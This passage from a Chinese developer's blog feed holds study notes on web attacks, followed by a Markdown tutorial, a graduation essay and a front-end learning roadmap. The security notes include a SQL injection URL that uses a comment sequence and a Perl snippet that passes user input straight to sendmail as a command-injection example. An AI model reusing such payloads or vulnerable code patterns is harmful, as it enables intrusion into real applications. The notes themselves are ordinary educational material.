class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?q=marry&apos;--</span><br><span class="line">select * from bookTbl where author=&quot;marry&quot; --&apos; and flag=1;</span><br></pre></td></tr></table></figure><h3 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指通过Web应用，执行非法的操作系统命令达到攻击的目的</li></ul><h4 id="攻击案例-2"><a href="#攻击案例-2" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q -&gt; param(&apos;mailaddress&apos;);</span><br><span class="line">open(MAIL,&quot;|/user/sbin/senmail  $adr&quot;);</span><br><span class="line">print MAIL &quot;Form:info@example.com\n&quot;;</span><br></pre></td></tr></table></figure><h3 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h3><h4 id="定义-5"><a href="#定义-5" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击</li></ul><h3 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h3><h4 id="定义-6"><a href="#定义-6" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击</li></ul><h3 id="目标遍历攻击"><a href="#目标遍历攻击" class="headerlink" title="目标遍历攻击"></a>目标遍历攻击</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击</li></ul><h3 id="跨站点请求伪造-CSRF"><a href="#跨站点请求伪造-CSRF" class="headerlink" title="跨站点请求伪造(CSRF)"></a>跨站点请求伪造(CSRF)</h3><h4 id="定义-8"><a href="#定义-8" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新</li></ul><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><h4 id="定义-9"><a href="#定义-9" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指利用透明的按钮或链接做成陷阱覆盖在Web页面之上</li></ul><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><h4 id="定义-10"><a href="#定义-10" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是一种让运行中的服务呈停止状态的攻击</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TCP-IP协议族&quot;&gt;&lt;a href=&quot;#TCP-IP协议族&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP协议族&quot;&gt;&lt;/a&gt;TCP/IP协议族&lt;/h2&gt;&lt;h3 id=&quot;重要思想-分层&quot;&gt;&lt;a href=&quot;#重要思想-分层&quot; class=&quot;headerlink&quot; title=&quot;重要思想:分层&quot;&gt;&lt;/a&gt;重要思想:&lt;code&gt;分层&lt;/code&gt;&lt;/h3&gt;&lt;h3 id=&quot;分层：&quot;&gt;&lt;a href=&quot;#分层：&quot; class=&quot;headerlink&quot; title=&quot;分层：&quot;&gt;&lt;/a&gt;分层：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;应用层：&lt;blockquote&gt;
&lt;p&gt;HTTP协议：生成针对目标web服务器的HTTP请求报文。&lt;br&gt;FTP协议：文件传输协议。&lt;br&gt;DNS协议： 域名解析协议。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="HTTP" scheme="http://dangoying.ink/categories/HTTP/"/>
    
    
      <category term="HTTP" scheme="http://dangoying.ink/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Markdown常用语法</title>
    <link href="http://dangoying.ink/Markdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html"/>
    <id>http://dangoying.ink/Markdown常用语法.html</id>
    <published>2018-03-30T15:04:22.000Z</published>
    <updated>2018-04-08T10:48:02.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在Markdown中，标题一共分为六级，只需在文字前加上 <code>#</code> 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># h1</span><br><span class="line">## h2</span><br><span class="line">### h3</span><br><span class="line">#### h4</span><br><span class="line">##### h5</span><br><span class="line">###### h6</span><br></pre></td></tr></table></figure><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>与标题作用类似，<code>=</code> 和 <code>-</code> 最少可只写一个，兼容性一般。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一级标题</span><br><span class="line">============</span><br><span class="line">二级标题</span><br><span class="line">------------</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>根据标题生成目录，兼容性一般，nexT主题已经开启自动生成目录。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]</span><br></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用可以分为单行引用和多行引用（引用块），同时只要根据层次加上 <code>&gt;</code> 就可以实现嵌套引用，引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。代码：</p><h3 id="单行式"><a href="#单行式" class="headerlink" title="单行式"></a>单行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p></blockquote><h3 id="多行式"><a href="#多行式" class="headerlink" title="多行式"></a>多行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">brand new world!</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果相同：</p><blockquote><p>hello world!<br>brand new world!</p></blockquote><h3 id="嵌套式"><a href="#嵌套式" class="headerlink" title="嵌套式"></a>嵌套式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt;&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p><blockquote><p>brand new world!</p></blockquote></blockquote><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>代码块可分为行内代码块和多行代码块。代码：</p><h3 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;div&gt;&lt;/div&gt;`</span><br></pre></td></tr></table></figure><p>效果：<br><code>&lt;div&gt;&lt;/div&gt;</code></p><h3 id="代码块-1"><a href="#代码块-1" class="headerlink" title="代码块"></a>代码块</h3><p>用三个反引号包裹一串代码，或者使用Tab缩进。注意要空开一行书写。<br>效果：</p><pre><code>&lt;div&gt;       &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="自定义语法"><a href="#自定义语法" class="headerlink" title="自定义语法"></a>自定义语法</h3><p>该方法可以根据不同的语言配置不同的代码着色。(代码在使用的时候去掉前面的反斜杠，这里为了防止被编译而加上)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\```javascript</span><br><span class="line">var num = 0;</span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line">\```console.log(num);</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(num);</span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Markdown中支持两种列表：无序列表和有序列表。</p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表有三种语法,可使用 <code>*</code> 、<code>+</code> 、 <code>-</code>作为列表标记。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*   Red</span><br><span class="line">*   Green</span><br><span class="line">*   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+   Red</span><br><span class="line">+   Green</span><br><span class="line">+   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-   Red</span><br><span class="line">-   Green</span><br><span class="line">-   Blue</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li>Red</li><li>Green</li><li>Blue</li></ul><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>在列表标记上使用的数字并不会影响输出的 HTML 结果，即可以让 Markdown 文件的列表数字和输出的结果相同，也可以完全不用在意数字的正确性。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  Bird</span><br><span class="line">2.  McHale</span><br><span class="line">3.  Parish</span><br></pre></td></tr></table></figure><p>效果：</p><ol><li>Bird</li><li>McHale</li><li>Parish</li></ol><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">- - -</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><p>效果：</p><hr><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。不管是哪一种，链接文字都是用 [方括号] 来标记。</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[an example](http://example.com/&quot;Title&quot;)&#123;:</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/&quot;Title&quot;" target="_blank" rel="noopener">an example</a></p><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>该链接必须带 <code>http://</code> ，否则会被解析成本地路径，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[an example][id]</span><br><span class="line">[id]: http://example.com/</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/" target="_blank" rel="noopener">an example</a></p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>Markdown 使用一种和链接很相似的语法来标记图片，和链接的主要区别在于在最开头需要标记 <code>!</code> 。同样分为行内式和参考式。</p><h3 id="行内式-1"><a href="#行内式-1" class="headerlink" title="行内式"></a>行内式</h3><p>方括号中用来放图片无法正常显示时的替代文字，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](../assets/blogImg/avatar.png)</span><br></pre></td></tr></table></figure><h3 id="参考式-1"><a href="#参考式-1" class="headerlink" title="参考式"></a>参考式</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![Alt text][01]</span><br><span class="line">[01]: ../assets/blogImg/avatar.png</span><br></pre></td></tr></table></figure><p>效果：<br><img src="../assets/blogImg/2018-3-31.jpg" alt="Alt text"></p><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h2><p>注意要空开一行书写。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">- [ ]  [选项3]</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二  </li><li style="list-style: none"><input type="checkbox"> 选项三</li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p><code>:</code> 代表对齐方式 , <code>:</code> 与 <code>|</code> 之间不要有空格，否则对齐会有些不兼容。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|    a    |       b       |      c     |</span><br><span class="line">|:-------:|:------------- | ----------:|</span><br><span class="line">|   居中  |     左对齐    |   右对齐   |</span><br><span class="line">|=========|===============|============|</span><br></pre></td></tr></table></figure><p>效果：</p><table><thead><tr><th style="text-align:center">a</th><th style="text-align:left">b</th><th style="text-align:right">c</th></tr></thead><tbody><tr><td style="text-align:center">居中</td><td style="text-align:left">左对齐</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:center">=========</td><td style="text-align:left">===============</td><td style="text-align:right">============</td></tr></tbody></table><p>简约写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a | b | c  </span><br><span class="line">:-:|:- |-:</span><br><span class="line">    居中    |     左对齐      |   右对齐    </span><br><span class="line">============|=================|=============</span><br></pre></td></tr></table></figure><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><table><thead><tr><th style="text-align:center">描述</th><th style="text-align:center">效果</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>*斜体*</code></td></tr><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>_斜体_</code></td></tr><tr><td style="text-align:center">加粗</td><td style="text-align:center"><strong>加粗</strong></td><td style="text-align:center"><code>**加粗**</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>***加粗+斜体***</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>**_加粗+斜体_**</code></td></tr><tr><td style="text-align:center">删除线</td><td style="text-align:center"><del>删除线</del></td><td style="text-align:center"><code>~~删除线~~</code></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h2&gt;&lt;p&gt;在Markdown中，标题一共分为六级，只需在文字前加上 &lt;code&gt;#&lt;/code&gt; 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# h1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## h2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;### h3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### h4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;##### h5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;###### h6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;分级标题&quot;&gt;&lt;a href=&quot;#分级标题&quot; class=&quot;headerlink&quot; title=&quot;分级标题&quot;&gt;&lt;/a&gt;分级标题&lt;/h2&gt;&lt;p&gt;与标题作用类似，&lt;code&gt;=&lt;/code&gt; 和 &lt;code&gt;-&lt;/code&gt; 最少可只写一个，兼容性一般。代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;一级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;============&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;二级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;------------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="语法" scheme="http://dangoying.ink/categories/%E8%AF%AD%E6%B3%95/"/>
    
    
      <category term="Markdown" scheme="http://dangoying.ink/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>人生这本书翻开新的一章</title>
    <link href="http://dangoying.ink/%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html"/>
    <id>http://dangoying.ink/人生这本书翻开新的一章.html</id>
    <published>2018-03-30T12:07:12.000Z</published>
    <updated>2018-03-30T15:02:26.615Z</updated>
    
    <content type="html"><![CDATA[<p><img src="./assets/blogImg/2018-3-30.jpg" alt=""><br><a id="more"></a><br>3月的尾巴，距离大学毕业还剩2个月左右的时间，昨晚和室友卧谈，聊起了在这个时间点，每个站在人生岔路口迷茫的我们。<br>最近考研、考公的都出了结果，漫长的备考过程，本期望着盼来好消息的两个室友却不得不面对与自己第一志愿失之交臂，在调剂亦或是就业中做出选择，当其他得到录取通知的同学开始整日整日放纵欢腾的时候，她们脸上是淡淡的笑，眼里却也有着对未来的迷茫。在和我一起逛过几次招聘会后，昨天其中一个室友说，她决定调剂，去一个离我们很远的地方继续她的学习生涯，说这话时，我能感觉到她隐隐的无奈，但也只能淡淡祝她好运，话题的最后，我仿佛听到自己内心一个声音问道：“这就是你当初不选择考研而是直接工作的原因吗？”<br>不是。去年的这个时候，当我做出这个决定周围经常会有人问“你成绩那么好，大学那么努力，为什么不考虑考研深造呢”，我不考研并不是因为我害怕最后会失败，而是我清楚的知道自己想要什么，即使学生时代那么让人留恋，但明确知道自己想做一名优秀程序媛的我，需要更多的是实践动手能力，在公司中不断参与项目的开发能更快提升我的能力，虽然一个更高的学历可能会为我在就业上扫除很多障碍，就不会像现在的我这样有些无助。不愿离开学生时代，倒不如说是不愿离开象牙塔。但是不管是哪一个选择都已经是过去式，与其缅怀过去不如立足当下。<br>现在的不顺利，是之前的准备不充分，机会是给有准备的人的这句话，不是失败者拿来自我安慰，所幸学习这件事，不管何时开始都不算晚，为了让自己更优秀，让自己成为HR眼中合适的人，让自己离自己的目标越来越接近，就从这篇博文开始，找回那个热血的自己。嘴上立志轻松容易，但学习却是持之以恒，愿自己初心莫负。</p><p>——<em>2018年3月30日于杭州师范大学</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;./assets/blogImg/2018-3-30.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://dangoying.ink/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://dangoying.ink/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="心情" scheme="http://dangoying.ink/tags/%E5%BF%83%E6%83%85/"/>
    
      <category term="生活" scheme="http://dangoying.ink/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>前端学习路线</title>
    <link href="http://dangoying.ink/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html"/>
    <id>http://dangoying.ink/前端学习路线.html</id>
    <published>2018-03-28T11:39:59.000Z</published>
    <updated>2018-03-30T12:31:47.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一阶段："><a href="#第一阶段：" class="headerlink" title="第一阶段："></a>第一阶段：</h2><ul><li>HTML+CSS：<br>HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。</li><li>JavaScript基础：<br>Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。</li><li>JS基本特效：<br>常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。<a id="more"></a></li><li>JS高级特征：<br>正则表达式、排序算法、递归算法、闭包、函数节流、作用域链、基于距离运动框架、面向对象基础。</li><li>JQuery：<br>悬着器、DOM操作、特效和动画、方法链、拖拽、变形、JQueryUI组件基本使用。</li></ul><h2 id="第二阶段：HTML5和移动Web开发"><a href="#第二阶段：HTML5和移动Web开发" class="headerlink" title="第二阶段：HTML5和移动Web开发"></a>第二阶段：HTML5和移动Web开发</h2><ul><li>HTML5：<br>HTML5新语义标签、HTML5表单、音频和视频、离线和本地存储、SVG、Web Socket、Canvas。</li><li>CSS3：<br>CSS3新选择器、伪元素、脸色表示法、边框、阴影、background系列属性改变、Transition、动画、景深和深透、3D效果制作、Velocity.js框架、元素进场、出场策略、炫酷CSS3网页制作。</li><li>Bootstrap:<br>响应式概念、媒体查询、响应式网站制作、删格系统、删格系统原理、Bootstrap常用模板、LESS和SASS。</li><li>移动Web开发：<br>跨终端WEB和主流设备简介、视口、流式布局、弹性盒子、rem、移动终端JavaScript事件、手机中常见JS效果制作、Zepto.js、手机聚划算页面、手机滚屏。</li></ul><h2 id="第三阶段：HTTP服务和AJAX编程"><a href="#第三阶段：HTTP服务和AJAX编程" class="headerlink" title="第三阶段：HTTP服务和AJAX编程"></a>第三阶段：HTTP服务和AJAX编程</h2><ul><li>WEB服务器基础：<br>服务器基础知识、Apache服务器和其他WEB服务器介绍、Apache服务器搭建、HTTP介绍。</li><li>PHP基础：<br>PHP基础语法、使用PHP处理简单的GET或者POST请求。</li><li>AJAX上篇：<br>Ajax简介和异步的概念、Ajax框架的封装、XMLHttpRequest对象详细介绍方法、兼容性处理方法、Ajax框架的封装、Ajax中缓存问题、XML介绍和使用。</li><li>AJAX下篇：<br>JSON和JSON解析、数据绑定和模板技术、JSONP、跨域技术、图片预读取和lazy-load技术、JQuery框架中的AjaxAPI、使用Ajax实现爆布流案例额。</li></ul><h2 id="第四阶段：HTTP服务和AJAX编程"><a href="#第四阶段：HTTP服务和AJAX编程" class="headerlink" title="第四阶段：HTTP服务和AJAX编程"></a>第四阶段：HTTP服务和AJAX编程</h2><ul><li>面向对象终极篇：<br>从内存角度到理解JS面向对象、基本类型、复杂类型、原型链、ES6中的面向对象、属性读写权限、设置器、访问器。</li><li>面向对象三大特征：<br>继承性、多态性、封装性、接口。</li><li>设计模式：<br>面向对象编程思维、单例模式、工厂模式、策略模式、观察者模式、模板方法模式、代理模式、装饰者模式、适配器模式、面向切面编程。</li></ul><h2 id="第五阶段：封装一个属于自己的框架"><a href="#第五阶段：封装一个属于自己的框架" class="headerlink" title="第五阶段：封装一个属于自己的框架"></a>第五阶段：封装一个属于自己的框架</h2><ul><li>框架封装基础：<br>事件流、冒泡、捕获、事件对象、事件框架、选择框架。</li><li>框架封装中级：<br>运动原理、单物体运动框架、多物体运动框架、运动框架面向对象封装。</li><li>框架封装高级和补充：<br>JQuery框架雏形、可扩展性、模块化、封装属于传智自己的框架。</li></ul><h2 id="第六阶段：模块化组件开发"><a href="#第六阶段：模块化组件开发" class="headerlink" title="第六阶段：模块化组件开发"></a>第六阶段：模块化组件开发</h2><ul><li>面向组件编程：<br>面向组件编程的方式、面向组件编程的实现原理、面向组件编程实战、基于组件化思想开发网站应用程序。</li><li>面向模块编程：<br>AMD设计规范、CMD设计规范、RequireJS，LoadJS、淘宝的SeaJS。</li></ul><h2 id="第七阶段：主流的流行框架"><a href="#第七阶段：主流的流行框架" class="headerlink" title="第七阶段：主流的流行框架"></a>第七阶段：主流的流行框架</h2><ul><li>Web开发工作流：<br>GIT/SVN、Yeoman脚手架、NPM/Bower依赖管理工具、Grunt/Gulp/Webpack。</li><li>MVC/MVVM/MVW框架：<br>Angular.js、Backbone.js、Knockout/Ember。</li><li>常用库：<br>React.js、Vue.js、Zepto.js。</li></ul><h2 id="第八阶段：HTML5原生移动应用开发"><a href="#第八阶段：HTML5原生移动应用开发" class="headerlink" title="第八阶段：HTML5原生移动应用开发"></a>第八阶段：HTML5原生移动应用开发</h2><ul><li>Cordova：<br>WebApp/NativeApp/HybirdApp简介、Cordova简介、与PhoneGap之间的关系、开发环境搭建、Cordova实战（创建项目，配置，编译，调试，部署发布）。</li><li>Ionic：<br>Ionic简介和同类对比、模板项目解析、常见组件及使用、结合Angular构建APP、常见效果（下拉刷新，上拉加载，侧滑导航，选项卡）。</li><li>React Native：<br>React Native简介、React Native环境配置、创建项目，配置，编译，调试，部署发布、原生模块和UI组件、原生常用API。</li><li>HTML5+：<br>HTML5+中国产业联盟、HTML5 Plus Runtime环境、HBuilder开发工具、MUI框架、H5+开发和部署。</li></ul><h2 id="第九阶段：Node-js全栈开发"><a href="#第九阶段：Node-js全栈开发" class="headerlink" title="第九阶段：Node.js全栈开发"></a>第九阶段：Node.js全栈开发</h2><ul><li>快速入门：<br>Node.js发展、生态圈、Io.js、Linux/Windows/OS 